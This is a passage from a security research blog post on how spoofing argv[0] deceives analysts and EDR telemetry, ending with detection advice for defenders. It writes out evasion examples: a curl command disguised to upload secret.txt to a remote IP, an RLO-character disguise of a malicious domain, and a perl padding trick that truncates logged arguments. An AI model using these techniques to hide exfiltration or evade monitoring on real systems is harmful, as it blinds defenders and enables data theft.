<p>Now consider the same scenario, but with <code>argv[0]</code> changed from <code>curl</code> to <code>curl localhost | grep</code>. This may seem weird, but this is valid: as we have seen, in POSIX, process command lines are an array of strings<sup id="fnref:ii" role="doc-noteref"><a href="#fn:ii" rel="footnote">2</a></sup>, and its first element is nearly always ignored, so we can put in it whatever we want. What’s more, security software often represents the array as a space-separated string. Thus, in this case, it will most likely be represented as <code>curl localhost | grep -T secret.txt 123.45.67.89</code>, despite the arguments that are being passed being <code>['curl localhost | grep', '-T', 'secret.txt', '123.45.67.89']</code>.</p>

<p><a href="https://www.wietzebeukema.nl/assets/2024-09-03-curl-argv0-manipulation.svg"><img src="https://www.wietzebeukema.nl/assets/2024-09-03-curl-argv0-manipulation.svg" alt="Diagram showing a curl command line broken down by argv, and demonstrating how manipulation can result in an unexpected EDR output."></a>
<em>Diagram showing how changing <code>argv[0]</code> of a <code>curl</code> command can optically change what command is being executed.</em></p>

<p>To the human eye, it may now appear as if <code>curl localhost</code> is executed, and its output passed to <code>grep -T secret.txt 123.45.67.89</code>. Despite the latter not making much sense as a command, the command now has an entirely different meaning: it gives the impression <code>curl</code> is used to <em>download</em> information from a <em>local</em> address, even though in reality it is used to <em>upload</em> information to a <em>remote</em> address.</p>

<p><a href="https://www.wietzebeukema.nl/assets/2024-09-03-spoofed-command.jpg"><img src="https://www.wietzebeukema.nl/assets/2024-09-03-spoofed-command.jpg" alt="Screenshot showing the successful manipulation of a curl command by setting its argv[0] value to a deceiving value."></a>
<em>The first window shows the execution of the spoofed <code>curl</code> command, with a <code>htop</code> window below it showing it was successful. The window on the right represents the external server, showing the contents of <code>secrets.txt</code> were successfully exfiltrated.</em></p>

<p>Another deception example is the use of the infamous Right-To-Left Override (RLO) character [<a href="https://unicode-explorer.com/c/202E">18</a>, <a href="https://www.mozilla.org/en-US/security/advisories/mfsa2009-62/">19</a>]. The presence of this Unicode character will tell the rendering application to display the characters that follow in reverse order. Inserting the RLO at the end of <code>argv[0]</code> could therefore make <code>ping moc.elgoog.some-evil-website.com</code> look like <code>ping moc.etisbew-live-emos.google.com</code>. Whilst this will not affect detection logic (since it merely messes with how data is displayed), it may well deceive analysts.</p>

<p><a href="https://www.wietzebeukema.nl/assets/2024-09-03-powershell-rlo.jpg"><img src="https://www.wietzebeukema.nl/assets/2024-09-03-powershell-rlo.jpg" alt="Screenshot showing an 'obfuscated' PowerShell command line using the RLO character."></a>
<em>Invoking a PowerShell command that downloads and executes BloodHound, with <code>argv[0]</code> containing the RLO character <code>\u202E</code>, makes it much harder to understand what is going on when looking at the reported command line.</em></p>

<h2 id="argv0-can-corrupt-telemetry"><code>argv[0]</code> can corrupt telemetry</h2>

<p>Finally, there is another way in which <code>argv[0]</code> can raise issues, thanks to the remarkable fact that this often-ignored argument is at the very <strong><em>start</em></strong> of every command line. If you were to stuff <code>argv[0]</code> with enough characters, you will push all other arguments to the very end of the command line. This matters for two reasons: we could once again fool analysts by ‘hiding’ the interesting parts of the command line (hoping they don’t scroll to the very end), but more interestingly, if you make the total command line length long enough, the actually relevant arguments may get truncated by monitoring software.</p>

<p>Since Windows 7, the maximum length of a command line on Windows is 14,336 characters [<a href="https://devblogs.microsoft.com/oldnewthing/20031210-00/?p=41553">20</a>], which equates to 14 KiB; in the Linux kernel the maximum is hardcoded to 32 page sizes [<a href="https://github.com/torvalds/linux/blob/master/include/uapi/linux/binfmts.h#L9-L15">21</a>] which on 64-bit architecture typically works out as 131,072 characters (128 KiB), whereas macOS Sonoma allows command lines to span up to a whopping 1,048,576 characters (1 MiB). That is a lot of arbitrary space <code>argv[0]</code> could potentially fill up.</p>

<p>Process monitoring software like <abbr title="Endpoint Detection &amp; Response, commonly found in enterprise">EDR</abbr> might either log such long command-line executions in full, or it may truncate it at a fixed length to reduce overhead. In case of the former, it is easy to see how someone might generate 1GiB worth of logging data on macOS by simply starting 1,000 processes utilising the maximum command-line length. Should some form of truncation be applied, it will be possible to cut off command-line arguments from the telemetry: a command like <code>perl -e 'exec {"echo"} "_"x50000, "Hello, world!"'</code> will successfully output “Hello, world!”, but telemetry of the execution may just record a bunch of underscores, or in some cases even a completely empty command line. Thus, the relevant command-line arguments are not present, and detection logic as well as analysts will be blind to what is actually going on.</p>

<p><a href="https://www.wietzebeukema.nl/assets/2024-09-03-truncated-edr-entry.jpg"><img src="https://www.wietzebeukema.nl/assets/2024-09-03-truncated-edr-entry.jpg" alt="Screenshot showing EDR telemetry of a process event, demonstrating the command-line component was truncated."></a>
<em>Although the <code>echo</code> command executed successfully, the process telemetry ending up in this SQL-based data lake only contains spoofed <code>argv[0]</code> data and no actual command-line arguments, as data is truncated at 32,766 characters.</em></p>

<p>All in all, we see that in trying to solve one problem, the concept of <code>argv[0]</code> introduces several other problems. Since <code>argv[0]</code> won’t be going away anytime soon, it is worth focussing on how to deal with this from a security standpoint.</p>

<p>Although software developers could validate whether the passed <code>argv[0]</code> has been tampered with by comparing it with its own filename, it is a solution that doesn’t scale well, and as argued before, is something the operating system could do much more reliably. As relying on <code>argv[0]</code> for changing a program’s flow is also highly inadvisable, developers are best off not interacting with it at all.</p>

<p>For security professionals, awareness of how <code>argv[0]</code> works and what flaws it introduces is an important step in countering any command-line deception. This post aims to help in this regard. Furthermore, it may be possible to automatically detect some <code>argv[0]</code>-based bypasses. Should your security software provide command-line arguments as an array instead of a space-separated string, it should be possible to reliably identify some of the described patterns. Overly long <code>argv[0]</code> values or ones containing suspicious characters like the pipe character should instantly be flagged as suspicious. Even with command-line arguments presented as a string, it should be possible to flag command lines that do not contain the program’s name, which suggests it has been tampered with. The mere presence of an RLO character in a command line is in most environments a high-efficacy detection. For possibly truncated command-line arguments, make sure you understand how your security solution and data lake handle this and how it affects the generated telemetry; are single event entries capable of holding all command-line data, even when stretched to the maximum?</p>

<p>Finally, this post calls for defensive software to improve their detection of <code>argv[0]</code> abuse. Preventing software executions with suspicious <code>argv[0]</code> values should be possible without causing any false positives. <abbr title="Endpoint Detection &amp; Response, commonly found in enterprise">EDR</abbr> platforms should also consider leaving out <code>argv[0]</code> when reporting on command-line arguments, as this will eliminate nearly ever problem highlighted in this post; its forensic value is often minimal to none, or can be more reliably sourced from other process aspects.</p>

<p>Ultimately, nobody wants to be bothered by <code>argv[0]</code>. And neither should our software.</p>
